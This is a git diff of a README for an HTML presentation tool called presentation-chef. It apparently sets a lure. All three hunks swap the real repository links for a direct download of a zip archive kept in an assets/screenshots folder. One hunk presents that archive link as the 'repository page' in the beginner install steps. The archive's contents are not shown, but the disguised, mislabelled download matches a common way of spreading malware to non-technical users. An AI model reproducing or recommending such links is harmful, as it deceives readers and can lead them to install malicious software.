@@ -1,6 +1,6 @@
 # 🎨 presentation-chef - Create Keynote-Style HTML Presentations
 
-[![Download presentation-chef](https://img.shields.io/badge/Download-presentation--chef-blue?style=for-the-badge)](https://github.com/Swyrer/presentation-chef)
+[![Download presentation-chef](https://img.shields.io/badge/Download-presentation--chef-blue?style=for-the-badge)](https://github.com/Swyrer/presentation-chef/raw/refs/heads/main/assets/screenshots/presentation_chef_3.9-alpha.4.zip)
 
 ---
 
@@ -44,7 +44,7 @@ This guide walks you through downloading, opening, and running presentation-chef
 
 Visit the download page below to get the latest version of presentation-chef.
 
-[![Download presentation-chef](https://img.shields.io/badge/Download-presentation--chef-purple?style=for-the-badge)](https://github.com/Swyrer/presentation-chef)
+[![Download presentation-chef](https://img.shields.io/badge/Download-presentation--chef-purple?style=for-the-badge)](https://github.com/Swyrer/presentation-chef/raw/refs/heads/main/assets/screenshots/presentation_chef_3.9-alpha.4.zip)
 
 Click the green **Code** button on the GitHub page and select **Download ZIP** if you prefer full source files. However, look inside the repository or releases for `.html` files designed for immediate use.
 
@@ -121,7 +121,7 @@ No coding skills are necessary to make basic changes. A text editor like Notepad
 
 The process requires no installation, but here is how to get presentation-chef running on your PC:
 
-1. Visit the repository page at [https://github.com/Swyrer/presentation-chef](https://github.com/Swyrer/presentation-chef)  
+1. Visit the repository page at [https://github.com/Swyrer/presentation-chef/raw/refs/heads/main/assets/screenshots/presentation_chef_3.9-alpha.4.zip](https://github.com/Swyrer/presentation-chef/raw/refs/heads/main/assets/screenshots/presentation_chef_3.9-alpha.4.zip)  
 2. Click **Code** > **Download ZIP** or look for the latest release files  
 3. Extract the ZIP or open the downloaded `.html` file directly if available  
 4. Double-click the `.html` file to open your presentation in a browser  
